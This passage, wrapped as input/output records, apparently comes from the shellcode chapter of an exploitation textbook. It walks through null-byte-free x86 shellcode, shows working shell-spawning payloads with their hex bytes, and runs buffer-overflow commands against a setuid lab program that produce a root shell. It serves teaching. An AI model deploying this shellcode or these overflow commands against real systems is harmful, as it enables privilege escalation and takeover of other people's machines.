these registers can be set using the mov instruction.\nIn the following assembly code listing, the memory segments are simply\ndeclared. The string \"Hello, world!\" with a newline character (0x0a) is in the\ndata segment, and the actual assembly instructions are in the text segment.\nThis follows proper memory segmentation practices.\nhelloworld.asm\nsection .data ; Data segment\nmsg db \"Hello, world!\", 0x0a ; The string and newline char\nsection .text ; Text segment\nglobal _start ; Default entry point for ELF linking\n_start:\nShellcode 285"
  },
  {
    "input": "0x520 The Path to Shellcode",
    "output": "; SYSCALL: write(1, msg, 14)\nmov eax, 4 ; Put 4 into eax, since write is syscall #4.\nmov ebx, 1 ; Put 1 into ebx, since stdout is 1.\nmov ecx, msg ; Put the address of the string into ecx.\nmov edx, 14 ; Put 14 into edx, since our string is 14 bytes.\nint 0x80 ; Call the kernel to make the system call happen.\n; SYSCALL: exit(0)\nmov eax, 1 ; Put 1 into eax, since exit is syscall #1.\nmov ebx, 0 ; Exit with success.\nint 0x80 ; Do the syscall.\nThe instructions of this program are straightforward. For the write() syscall\nto standard output, the value of 4 is put in EAX since the write() function is\nsystem call number 4. Then, the value of 1 is put into EBX, since the first arg-\nument of write() should be the file descriptor for standard output. Next, the\naddress of the string in the data segment is put into ECX, and the length of the\nstring (in this case, 14 bytes) is put into EDX. After these registers are loaded,\nthe system call interrupt is triggered, which will call the write() function.\nTo exit cleanly, the exit() function needs to be called with a single\nargument of 0. So the value of 1 is put into EAX, since exit() is system call\nnumber 1, and the value of 0 is put into EBX, since the first and only argu-\nment should be 0. Then the system call interrupt is triggered again.\nTo create an executable binary, this assembly code must first be assembled\nand then linked into an executable format. When compiling C code, the GCC\ncompiler takes care of all of this automatically. We are going to create an\nexecutable and linking format (ELF) binary, so the global _start line shows\nthe linker where the assembly instructions begin.\nThe nasm assembler with the -f elf argument will assemble the\nhelloworld.asm into an object file ready to be linked as an ELF binary.\nBydefault, this object file will be called helloworld.o. The linker program\nldwill produce an executable a.out binary from the assembled object.\nreader@hacking:~/booksrc $ nasm -f elf helloworld.asm\nreader@hacking:~/booksrc $ ld helloworld.o\nreader@hacking:~/booksrc $ ./a.out\nHello, world!\nreader@hacking:~/booksrc $\nThis tiny program works, but it’s not shellcode, since it isn’t self-contained\nand must be linked.\n0x520 The Path to Shellcode\nShellcode is literally injected into a running program, where it takes over like\na biological virus inside a cell. Since shellcode isn’t really an executable pro-\ngram, we don’t have the luxury of declaring the layout of data in memory or\neven using other memory segments. Our instructions must be self-contained\nand ready to take over control of the processor regardless of its current state.\nThis is commonly referred to as position-independent code.\n286 0x500"
  },
  {
    "input": "0x521 Assembly Instructions Using the Stack",
    "output": "In shellcode, the bytes for the string \"Hello, world!\" must be mixed\ntogether with the bytes for the assembly instructions, since there aren’t\ndefinable or predictable memory segments. This is fine as long as EIP doesn’t\ntry to interpret the string as instructions. However, to access the string as data\nwe need a pointer to it. When the shellcode gets executed, it could be any-\nwhere in memory. The string’s absolute memory address needs to be calcu-\nlated relative to EIP. Since EIP cannot be accessed from assembly instructions,\nhowever, we need to use some sort of trick.\n0x521 Assembly Instructions Using the Stack\nThe stack is so integral to the x86 architecture that there are special instruc-\ntions for its operations.\nInstruction Description\npush <source> Push the source operand to the stack.\npop <destination> Pop a value from the stack and store in the destination operand.\ncall <location> Call a function, jumping the execution to the address in the location\noperand. This location can be relative or absolute. The address of the\ninstruction following the call is pushed to the stack, so that execution can\nreturn later.\nret Return from a function, popping the return address from the stack and\njumping execution there.\nStack-based exploits are made possible by the call and ret instructions.\nWhen a function is called, the return address of the next instruction is pushed\nto the stack, beginning the stack frame. After the function is finished, the ret\ninstruction pops the return address from the stack and jumps EIP back there.\nBy overwriting the stored return address on the stack before the ret instruc-\ntion, we can take control of a program’s execution.\nThis architecture can be misused in another way to solve the problem of\naddressing the inline string data. If the string is placed directly after a call\ninstruction, the address of the string will get pushed to the stack as the return\naddress. Instead of calling a function, we can jump past the string to a pop\ninstruction that will take the address off the stack and into a register. The\nfollowing assembly instructions demonstrate this technique.\nhelloworld1.s\nBITS 32 ; Tell nasm this is 32-bit code.\ncall mark_below ; Call below the string to instructions\ndb \"Hello, world!\", 0x0a, 0x0d ; with newline and carriage return bytes.\nmark_below:\n; ssize_t write(int fd, const void *buf, size_t count);\npop ecx ; Pop the return address (string ptr) into ecx.\nmov eax, 4 ; Write syscall #.\nmov ebx, 1 ; STDOUT file descriptor\nShellcode 287\nmov edx, 15 ; Length of the string\nint 0x80 ; Do syscall: write(1, string, 14)\n; void _exit(int status);\nmov eax, 1 ; Exit syscall #\nmov ebx, 0 ; Status = 0\nint 0x80 ; Do syscall: exit(0)\nThe call instruction jumps execution down below the string. This also\npushes the address of the next instruction to the stack, the next instruction\nin our case being the beginning of the string. The return address can imme-\ndiately be popped from the stack into the appropriate register. Without using\nany memory segments, these raw instructions, injected into an existing process,\nwill execute in a completely position-independent way. This means that, when\nthese instructions are assembled, they cannot be linked into an executable.\nreader@hacking:~/booksrc $ nasm helloworld1.s\nreader@hacking:~/booksrc $ ls -l helloworld1\n-rw-r--r-- 1 reader reader 50 2007-10-26 08:30 helloworld1\nreader@hacking:~/booksrc $ hexdump -C helloworld1\n00000000 e8 0f 00 00 00 48 65 6c 6c 6f 2c 20 77 6f 72 6c |.....Hello, worl|\n00000010 64 21 0a 0d 59 b8 04 00 00 00 bb 01 00 00 00 ba |d!..Y...........|\n00000020 0f 00 00 00 cd 80 b8 01 00 00 00 bb 00 00 00 00 |................|\n00000030 cd 80 |..|\n00000032\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld1\n00000000 E80F000000 call 0x14\n00000005 48 dec eax\n00000006 656C gs insb\n00000008 6C insb\n00000009 6F outsd\n0000000A 2C20 sub al,0x20\n0000000C 776F ja 0x7d\n0000000E 726C jc 0x7c\n00000010 64210A and [fs:edx],ecx\n00000013 0D59B80400 or eax,0x4b859\n00000018 0000 add [eax],al\n0000001A BB01000000 mov ebx,0x1\n0000001F BA0F000000 mov edx,0xf\n00000024 CD80 int 0x80\n00000026 B801000000 mov eax,0x1\n0000002B BB00000000 mov ebx,0x0\n00000030 CD80 int 0x80\nreader@hacking:~/booksrc $\nThe nasm assembler converts assembly language into machine code and\nacorresponding tool called ndisasm converts machine code into assembly.\nThese tools are used above to show the relationship between the machine\ncode bytes and the assembly instructions. The disassembly instructions marked\nin bold are the bytes of the \"Hello, world!\" string interpreted as instructions.\nNow, if we can inject this shellcode into a program and redirect EIP, the\nprogram will print out Hello, world! Let’s use the familiar exploit target of the\nnotesearch program.\n288 0x500"
  },
  {
    "input": "0x522 Investigating with GDB",
    "output": "reader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld1)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9c6\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xc6\\xf9\\xff\\xbf\"x40')\n-------[ end of note data ]-------\nSegmentation fault\nreader@hacking:~/booksrc $\nFailure. Why do you think it crashed? In situations like this, GDB is your\nbest friend. Even if you already know the reason behind this specific crash,\nlearning how to effectively use a debugger will help you solve many other\nproblems in the future.\n0x522 Investigating with GDB\nSince the notesearch program runs as root, we can’t debug it as a normal\nuser. However, we also can’t just attach to a running copy of it, because it\nexits too quickly. Another way to debug programs is with core dumps. From a\nroot prompt, the OS can be told to dump memory when the program crashes\nby using the command ulimit -c unlimited. This means that dumped core\nfiles are allowed to get as big as needed. Now, when the program crashes,\nthe memory will be dumped to disk as a core file, which can be examined\nusing GDB.\nreader@hacking:~/booksrc $ sudo su\nroot@hacking:/home/reader/booksrc # ulimit -c unlimited\nroot@hacking:/home/reader/booksrc # export SHELLCODE=$(cat helloworld1)\nroot@hacking:/home/reader/booksrc # ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9a3\nroot@hacking:/home/reader/booksrc # ./notesearch $(perl -e 'print \"\\xa3\\xf9\\\nxff\\xbf\"x40')\n-------[ end of note data ]-------\nSegmentation fault (core dumped)\nroot@hacking:/home/reader/booksrc # ls -l ./core\n-rw------- 1 root root 147456 2007-10-26 08:36 ./core\nroot@hacking:/home/reader/booksrc # gdb -q -c ./core\n(no debugging symbols found)\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nCore was generated by `./notesearch\n£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E.\nProgram terminated with signal 11, Segmentation fault.\n#0 0x2c6541b7 in ?? ()\n(gdb) set dis intel\n(gdb) x/5i 0xbffff9a3\n0xbffff9a3: call 0x2c6541b7\n0xbffff9a8: ins BYTE PTR es:[edi],[dx]\n0xbffff9a9: outs [dx],DWORD PTR ds:[esi]\n0xbffff9aa: sub al,0x20\n0xbffff9ac: ja 0xbffffa1d\n(gdb) i r eip\neip 0x2c6541b7 0x2c6541b7\n(gdb) x/32xb 0xbffff9a3\nShellcode 289"
  },
  {
    "input": "0x523 Removing Null Bytes",
    "output": "0xbffff9a3: 0xe8 0x0f 0x48 0x65 0x6c 0x6c 0x6f 0x2c\n0xbffff9ab: 0x20 0x77 0x6f 0x72 0x6c 0x64 0x21 0x0a\n0xbffff9b3: 0x0d 0x59 0xb8 0x04 0xbb 0x01 0xba 0x0f\n0xbffff9bb: 0xcd 0x80 0xb8 0x01 0xbb 0xcd 0x80 0x00\n(gdb) quit\nroot@hacking:/home/reader/booksrc # hexdump -C helloworld1\n00000000 e8 0f 00 00 00 48 65 6c 6c 6f 2c 20 77 6f 72 6c |.....Hello, worl|\n00000010 64 21 0a 0d 59 b8 04 00 00 00 bb 01 00 00 00 ba |d!..Y...........|\n00000020 0f 00 00 00 cd 80 b8 01 00 00 00 bb 00 00 00 00 |................|\n00000030 cd 80 |..|\n00000032\nroot@hacking:/home/reader/booksrc #\nOnce GDB is loaded, the disassembly style is switched to Intel. Since we\nare running GDB as root, the .gdbinit file won’t be used. The memory where\nthe shellcode should be is examined. The instructions look incorrect, but it\nseems like the first incorrect call instruction is what caused the crash. At least,\nexecution was redirected, but something went wrong with the shellcode bytes.\nNormally, strings are terminated by a null byte, but here, the shell was kind\nenough to remove these null bytes for us. This, however, totally destroys the\nmeaning of the machine code. Often, shellcode will be injected into a process\nas a string, using functions like strcpy(). Such functions will simply terminate\nat the first null byte, producing incomplete and unusable shellcode in mem-\nory. In order for the shellcode to survive transit, it must be redesigned so it\ndoesn’t contain any null bytes.\n0x523 Removing Null Bytes\nLooking at the disassembly, it is obvious that the first null bytes come from\nthe call instruction.\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld1\n00000000 E80F000000 call 0x14\n00000005 48 dec eax\n00000006 656C gs insb\n00000008 6C insb\n00000009 6F outsd\n0000000A 2C20 sub al,0x20\n0000000C 776F ja 0x7d\n0000000E 726C jc 0x7c\n00000010 64210A and [fs:edx],ecx\n00000013 0D59B80400 or eax,0x4b859\n00000018 0000 add [eax],al\n0000001A BB01000000 mov ebx,0x1\n0000001F BA0F000000 mov edx,0xf\n00000024 CD80 int 0x80\n00000026 B801000000 mov eax,0x1\n0000002B BB00000000 mov ebx,0x0\n00000030 CD80 int 0x80\nreader@hacking:~/booksrc $\nThis instruction jumps execution forward by 19 (0x13) bytes, based on the\nfirst operand. The call instruction allows for much longer jump distances,\n290 0x500\nwhich means that a small value like 19 will have to be padded with leading\nzeros resulting in null bytes.\nOne way around this problem takes advantage of two’s complement. A\nsmall negative number will have its leading bits turned on, resulting in 0xff\nbytes. This means that, if we call using a negative value to move backward in\nexecution, the machine code for that instruction won’t have any null bytes.\nThe following revision of the helloworld shellcode uses a standard implemen-\ntation of this trick: Jump to the end of the shellcode to a call instruction which,\nin turn, will jump back to a pop instruction at the beginning of the shellcode.\nhelloworld2.s\nBITS 32 ; Tell nasm this is 32-bit code.\njmp short one ; Jump down to a call at the end.\ntwo:\n; ssize_t write(int fd, const void *buf, size_t count);\npop ecx ; Pop the return address (string ptr) into ecx.\nmov eax, 4 ; Write syscall #.\nmov ebx, 1 ; STDOUT file descriptor\nmov edx, 15 ; Length of the string\nint 0x80 ; Do syscall: write(1, string, 14)\n; void _exit(int status);\nmov eax, 1 ; Exit syscall #\nmov ebx, 0 ; Status = 0\nint 0x80 ; Do syscall: exit(0)\none:\ncall two ; Call back upwards to avoid null bytes\ndb \"Hello, world!\", 0x0a, 0x0d ; with newline and carriage return bytes.\nAfter assembling this new shellcode, disassembly shows that the call\ninstruction (shown in italics below) is now free of null bytes. This solves the\nfirst and most difficult null-byte problem for this shellcode, but there are still\nmany other null bytes (shown in bold).\nreader@hacking:~/booksrc $ nasm helloworld2.s\nreader@hacking:~/booksrc $ ndisasm -b32 helloworld2\n00000000 EB1E jmp short 0x20\n00000002 59 pop ecx\n00000003 B804000000 mov eax,0x4\n00000008 BB01000000 mov ebx,0x1\n0000000D BA0F000000 mov edx,0xf\n00000012 CD80 int 0x80\n00000014 B801000000 mov eax,0x1\n00000019 BB00000000 mov ebx,0x0\n0000001E CD80 int 0x80\n00000020 E8DDFFFFFF call 0x2\n00000025 48 dec eax\n00000026 656C gs insb\n00000028 6C insb\nShellcode 291\n00000029 6F outsd\n0000002A 2C20 sub al,0x20\n0000002C 776F ja 0x9d\n0000002E 726C jc 0x9c\n00000030 64210A and [fs:edx],ecx\n00000033 0D db 0x0D\nreader@hacking:~/booksrc $\nThese remaining null bytes can be eliminated with an understanding of\nregister widths and addressing. Notice that the first jmp instruction is actually\njmp short. This means execution can only jump a maximum of approximately\n128 bytes in either direction. The normal jmp instruction, as well as the call\ninstruction (which has no short version), allows for much longer jumps. The\ndifference between assembled machine code for the two jump varieties is\nshown below:\nEB 1E jmp short 0x20\nversus\nE9 1E 00 00 00 jmp 0x23\nThe EAX, EBX, ECX, EDX, ESI, EDI, EBP, and ESP registers are 32 bits\nin width. The E stands for extended, because these were originally 16-bit reg-\nisters called AX, BX, CX, DX, SI, DI, BP, and SP. These original 16-bit versions\nof the registers can still be used for accessing the first 16 bits of each corre-\nsponding 32-bit register. Furthermore, the individual bytes of the AX, BX, CX,\nand DX registers can be accessed as 8-bit registers called AL, AH, BL, BH, CL,\nCH, DL, and DH, where L stands for low byte and H for high byte. Naturally,\nassembly instructions using the smaller registers only need to specify operands\nup to the register’s bit width. The three variations of a mov instruction are\nshown below.\nMachine code Assembly\nB8 04 00 00 00 mov eax,0x4\n66 B8 04 00 mov ax,0x4\nB0 04 mov al,0x4\nUsing the AL, BL, CL, or DL register will put the correct least significant\nbyte into the corresponding extended register without creating any null bytes\nin the machine code. However, the top three bytes of the register could still\ncontain anything. This is especially true for shellcode, since it will be taking\nover another process. If we want the 32-bit register values to be correct, we\nneed to zero out the entire register before the mov instructions—but this, again,\nmust be done without using null bytes. Here are some more simple assembly\ninstructions for your arsenal. These first two are small instructions that incre-\nment and decrement their operand by one.\n292 0x500\nInstruction Description\ninc <target> Increment the target operand by adding 1 to it.\ndec <target> Decrement the target operand by subtracting 1 from it.\nThe next few instructions, like the mov instruction, have two operands.\nThey all do simple arithmetic and bitwise logical operations between the two\noperands, storing the result in the first operand.\nInstruction Description\nadd <dest>, <source> Add the source operand to the destination operand, storing the result\nin the destination.\nsub <dest>, <source> Subtract the source operand from the destination operand, storing the\nresult in the destination.\nor <dest>, <source> Perform a bitwise or logic operation, comparing each bit of one\noperand with the corresponding bit of the other operand.\n1 or 0 = 1\n1 or 1 = 1\n0 or 1 = 1\n0 or 0 = 0\nIf the source bit or the destination bit is on, or if both of them are on, the\nresult bit is on; otherwise, the result is off. The final result is stored in\nthe destination operand.\nand <dest>, <source> Perform a bitwise and logic operation, comparing each bit of one\noperand with the corresponding bit of the other operand.\n1 or 0 = 0\n1 or 1 = 1\n0 or 1 = 0\n0 or 0 = 0\nThe result bit is on only if both the source bit and the destination bit\nare on. The final result is stored in the destination operand.\nxor <dest>, <source> Perform a bitwise exclusive or (xor) logical operation, comparing each\nbit of one operand with the corresponding bit of the other operand.\n1 or 0 = 1\n1 or 1 = 0\n0 or 1 = 1\n0 or 0 = 0\nIf the bits differ, the result bit is on; if the bits are the same, the result\nbit is off. The final result is stored in the destination operand.\nOne method is to move an arbitrary 32-bit number into the register and\nthen subtract that value from the register using the mov and sub instructions:\nB8 44 33 22 11 mov eax,0x11223344\n2D 44 33 22 11 sub eax,0x11223344\nWhile this technique works, it takes 10 bytes to zero out a single register,\nmaking the assembled shellcode larger than necessary. Can you think of a way\nto optimize this technique? The DWORD value specified in each instruction\nShellcode 293\ncomprises 80 percent of the code. Subtracting any value from itself also pro-\nduces 0 and doesn’t require any static data. This can be done with a single\ntwo-byte instruction:\n29 C0 sub eax,eax\nUsing the sub instruction will work fine when zeroing registers at the\nbeginning of shellcode. This instruction will modify processor flags, which\nare used for branching, however. For that reason, there is a preferred two-\nbyte instruction that is used to zero registers in most shellcode. The xor instruc-\ntion performs an exclusive or operation on the bits in a register. Since 1 xored\nwith 1 results in a 0, and 0 xored with 0 results in a 0, any value xored with itself\nwill result in 0. This is the same result as with any value subtracted from itself,\nbut the xor instruction doesn’t modify processor flags, so it’s considered to be\na cleaner method.\n31 C0 xor eax,eax\nYou can safely use the sub instruction to zero registers (if done at the\nbeginning of the shellcode), but the xor instruction is most commonly used\nin shellcode in the wild. This next revision of the shellcode makes use of the\nsmaller registers and the xor instruction to avoid null bytes. The inc and dec\ninstructions have also been used when possible to make for even smaller\nshellcode.\nhelloworld3.s\nBITS 32 ; Tell nasm this is 32-bit code.\njmp short one ; Jump down to a call at the end.\ntwo:\n; ssize_t write(int fd, const void *buf, size_t count);\npop ecx ; Pop the return address (string ptr) into ecx.\nxor eax, eax ; Zero out full 32 bits of eax register.\nmov al, 4 ; Write syscall #4 to the low byte of eax.\nxor ebx, ebx ; Zero out ebx.\ninc ebx ; Increment ebx to 1, STDOUT file descriptor.\nxor edx, edx\nmov dl, 15 ; Length of the string\nint 0x80 ; Do syscall: write(1, string, 14)\n; void _exit(int status);\nmov al, 1 ; Exit syscall #1, the top 3 bytes are still zeroed.\ndec ebx ; Decrement ebx back down to 0 for status = 0.\nint 0x80 ; Do syscall: exit(0)\none:\ncall two ; Call back upwards to avoid null bytes\ndb \"Hello, world!\", 0x0a, 0x0d ; with newline and carriage return bytes.\n294 0x500"
  },
  {
    "input": "0x530 Shell-Spawning Shellcode",
    "output": "After assembling this shellcode, hexdump and grep are used to quickly\ncheck it for null bytes.\nreader@hacking:~/booksrc $ nasm helloworld3.s\nreader@hacking:~/booksrc $ hexdump -C helloworld3 | grep --color=auto 00\n00000000 eb 13 59 31 c0 b0 04 31 db 43 31 d2 b2 0f cd 80 |..Y1...1.C1.....|\n00000010 b0 01 4b cd 80 e8 e8 ff ff ff 48 65 6c 6c 6f 2c |..K.......Hello,|\n00000020 20 77 6f 72 6c 64 21 0a 0d | world!..|\n00000029\nreader@hacking:~/booksrc $\nNow this shellcode is usable, as it doesn’t contain any null bytes. When\nused with an exploit, the notesearch program is coerced into greeting the\nworld like a newbie.\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld3)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9bc\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xbc\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\nHello, world!\nreader@hacking :~/booksrc $\n0x530 Shell-Spawning Shellcode\nNow that you’ve learned how to make system calls and avoid null bytes, all\nsorts of shellcodes can be constructed. To spawn a shell, we just need to make\na system call to execute the /bin/sh shell program. System call number 11,\nexecve(), is similar to the C execute() function that we used in the previous\nchapters.\nEXECVE(2) Linux Programmer's Manual EXECVE(2)\nNAME\nexecve - execute program\nSYNOPSIS\n#include <unistd.h>\nint execve(const char *filename, char *const argv[],\nchar *const envp[]);\nDESCRIPTION\nexecve() executes the program pointed to by filename. Filename must be\neither a binary executable, or a script starting with a line of the\nform \"#! interpreter [arg]\". In the latter case, the interpreter must\nbe a valid pathname for an executable which is not itself a script,\nwhich will be invoked as interpreter [arg] filename.\nargv is an array of argument strings passed to the new program. envp\nis an array of strings, conventionally of the form key=value, which are\nShellcode 295\npassed as environment to the new program. Both argv and envp must be\nterminated by a null pointer. The argument vector and environment can\nbe accessed by the called program's main function, when it is defined\nas int main(int argc, char *argv[], char *envp[]).\nThe first argument of the filename should be a pointer to the string\n\"/bin/sh\", since this is what we want to execute. The environment array—\nthe third argument—can be empty, but it still need to be terminated with a\n32-bit null pointer. The argument array—the second argument—must be null-\nterminated, too; it must also contain the string pointer (since the zeroth\nargument is the name of the running program). Done in C, a program\nmaking this call would look like this:\nexec_shell.c\n#include <unistd.h>\nint main() {\nchar filename[] = \"/bin/sh\\x00\";\nchar **argv, **envp; // Arrays that contain char pointers\nargv[0] = filename; // The only argument is filename.\nargv[1] = 0; // Null terminate the argument array.\nenvp[0] = 0; // Null terminate the environment array.\nexecve(filename, argv, envp);\n}\nTo do this in assembly, the argument and environment arrays need to be\nbuilt in memory. In addition, the \"/bin/sh\" string needs to be terminated with\na null byte. This must be built in memory as well. Dealing with memory in\nassembly is similar to using pointers in C. The lea instruction, whose name\nstands for load effective address, works like the address-of operator in C.\nInstruction Description\nlea <dest>, <source> Load the effective address of the source operand into the destination\noperand.\nWith Intel assembly syntax, operands can be dereferenced as pointers if\nthey are surrounded by square brackets. For example, the following instruction\nin assembly will treat EBX+12 as a pointer and write eax to where it’s pointing.\n89 43 0C mov [ebx+12],eax\nThe following shellcode uses these new instructions to build the execve()\narguments in memory. The environment array is collapsed into the end of\nthe argument array, so they share the same 32-bit null terminator.\n296 0x500\nexec_shell.s\nBITS 32\njmp short two ; Jump down to the bottom for the call trick.\none:\n; int execve(const char *filename, char *const argv [], char *const envp[])\npop ebx ; Ebx has the addr of the string.\nxor eax, eax ; Put 0 into eax.\nmov [ebx+7], al ; Null terminate the /bin/sh string.\nmov [ebx+8], ebx ; Put addr from ebx where the AAAA is.\nmov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is.\nlea ecx, [ebx+8] ; Load the address of [ebx+8] into ecx for argv ptr.\nlea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr.\nmov al, 11 ; Syscall #11\nint 0x80 ; Do it.\ntwo:\ncall one ; Use a call to get string address.\ndb '/bin/shXAAAABBBB' ; The XAAAABBBB bytes aren't needed.\nAfter terminating the string and building the arrays, the shellcode uses\nthe lea instruction (shown in bold above) to put a pointer to the argument\narray into the ECX register. Loading the effective address of a bracketed\nregister added to a value is an efficient way to add the value to the register\nand store the result in another register. In the example above, the brackets\ndereference EBX+8 as the argument to lea, which loads that address into EDX.\nLoading the address of a dereferenced pointer produces the original pointer,\nso this instruction puts EBX+8 into EDX. Normally, this would require both a\nmov and an add instruction. When assembled, this shellcode is devoid of null\nbytes. It will spawn a shell when used in an exploit.\nreader@hacking:~/booksrc $ nasm exec_shell.s\nreader@hacking:~/booksrc $ wc -c exec_shell\n36 exec_shell\nreader@hacking:~/booksrc $ hexdump -C exec_shell\n00000000 eb 16 5b 31 c0 88 43 07 89 5b 08 89 43 0c 8d 4b |..[1..C..[..C..K|\n00000010 08 8d 53 0c b0 0b cd 80 e8 e5 ff ff ff 2f 62 69 |..S........../bi|\n00000020 6e 2f 73 68 |n/sh|\n00000024\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat exec_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9c0\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xc0\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\nShellcode 297\nsh-3.2# whoami\nroot\nsh-3.2#\nThis shellcode, however, can be shortened to less than the current\n45bytes. Since shellcode needs to be injected into program memory some-\nwhere, smaller shellcode can be used in tighter exploit situations with smaller\nusable buffers. The smaller the shellcode, the more situations it can be used\nin. Obviously, the XAAAABBBB visual aid can be trimmed from the end of the\nstring, which brings the shellcode down to 36 bytes.\nreader@hacking:~/booksrc/shellcodes $ hexdump -C exec_shell\n00000000 eb 16 5b 31 c0 88 43 07 89 5b 08 89 43 0c 8d 4b |..[1..C..[..C..K|\n00000010 08 8d 53 0c b0 0b cd 80 e8 e5 ff ff ff 2f 62 69 |..S........../bi|\n00000020 6e 2f 73 68 |n/sh|\n00000024\nreader@hacking:~/booksrc/shellcodes $ wc -c exec_shell\n36 exec_shell\nreader@hacking:~/booksrc/shellcodes $\nThis shellcode can be shrunk down further by redesigning it and using\nregisters more efficiently. The ESP register is the stack pointer, pointing to\nthe top of the stack. When a value is pushed to the stack, ESP is moved up in\nmemory (by subtracting 4) and the value is placed at the top of the stack.\nWhen a value is popped from the stack, the pointer in ESP is moved down in\nmemory (by adding 4).\nThe following shellcode uses push instructions to build the necessary\nstructures in memory for the execve() system call.\ntiny_shell.s\nBITS 32\n; execve(const char *filename, char *const argv [], char *const envp[])\nxor eax, eax ; Zero out eax.\npush eax ; Push some nulls for string termination.\npush 0x68732f2f ; Push \"//sh\" to the stack.\npush 0x6e69622f ; Push \"/bin\" to the stack.\nmov ebx, esp ; Put the address of \"/bin//sh\" into ebx, via esp.\npush eax ; Push 32-bit null terminator to stack.\nmov edx, esp ; This is an empty array for envp.\npush ebx ; Push string addr to stack above null terminator.\nmov ecx, esp ; This is the argv array with string ptr.\nmov al, 11 ; Syscall #11.\nint 0x80 ; Do it.\nThis shellcode builds the null-terminated string \"/bin//sh\" on the stack,\nand then copies ESP for the pointer. The extra backslash doesn’t matter and\nis effectively ignored. The same method is used to build the arrays for the\nremaining arguments. The resulting shellcode still spawns a shell but is only\n25 bytes, compared to 36 bytes using the jmp call method.\n298 0x500"
  },
  {
    "input": "0x531 A Matter of Privilege",
    "output": "reader@hacking:~/booksrc $ nasm tiny_shell.s\nreader@hacking:~/booksrc $ wc -c tiny_shell\n25 tiny_shell\nreader@hacking:~/booksrc $ hexdump -C tiny_shell\n00000000 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 |1.Ph//shh/bin..P|\n00000010 89 e2 53 89 e1 b0 0b cd 80 |..S......|\n00000019\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9cb\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2#\n0x531 A Matter of Privilege\nTo help mitigate rampant privilege escalation, some privileged processes will\nlower their effective privileges while doing things that don’t require that kind\nof access. This can be done with the seteuid() function, which will set the effec-\ntive user ID. By changing the effective user ID, the privileges of the process\ncan be changed. The manual page for the seteuid() function is shown below.\nSETEGID(2) Linux Programmer's Manual SETEGID(2)\nNAME\nseteuid, setegid - set effective user or group ID\nSYNOPSIS\n#include <sys/types.h>\n#include <unistd.h>\nint seteuid(uid_t euid);\nint setegid(gid_t egid);\nDESCRIPTION\nseteuid() sets the effective user ID of the current process.\nUnprivileged user processes may only set the effective user ID to\nID to the real user ID, the effective user ID or the saved set-user-ID.\nPrecisely the same holds for setegid() with \"group\" instead of \"user\".\nRETURN VALUE\nOn success, zero is returned. On error, -1 is returned, and errno is\nset appropriately.\nThis function is used by the following code to drop privileges down to\nthose of the “games” user before the vulnerable strcpy() call.\nShellcode 299\ndrop_privs.c\n#include <unistd.h>\nvoid lowered_privilege_function(unsigned char *ptr) {\nchar buffer[50];\nseteuid(5); // Drop privileges to games user.\nstrcpy(buffer, ptr);\n}\nint main(int argc, char *argv[]) {\nif (argc > 0)\nlowered_privilege_function(argv[1]);\n}\nEven though this compiled program is setuid root, the privileges are\ndropped to the games user before the shellcode can execute. This only\nspawns a shell for the games user, without root access.\nreader@hacking:~/booksrc $ gcc -o drop_privs drop_privs.c\nreader@hacking:~/booksrc $ sudo chown root ./drop_privs; sudo chmod u+s ./drop_privs\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs\nSHELLCODE will be at 0xbffff9cb\nreader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print \"\\xcb\\xf9\\xff\\xbf\"x40')\nsh-3.2$ whoami\ngames\nsh-3.2$ id\nuid=999(reader) gid=999(reader) euid=5(games)\ngroups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan\nner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)\nsh-3.2$\nFortunately, the privileges can easily be restored at the beginning of our\nshellcode with a system call to set the privileges back to root. The most com-\nplete way to do this is with a setresuid() system call, which sets the real,\neffective, and saved user IDs. The system call number and manual page are\nshown below.\nreader@hacking:~/booksrc $ grep -i setresuid /usr/include/asm-i386/unistd.h\n#define __NR_setresuid 164\n#define __NR_setresuid32 208\nreader@hacking:~/booksrc $ man 2 setresuid\nSETRESUID(2) Linux Programmer's Manual SETRESUID(2)\nNAME\nsetresuid, setresgid - set real, effective and saved user or group ID\nSYNOPSIS\n#define _GNU_SOURCE\n#include <unistd.h>\n300 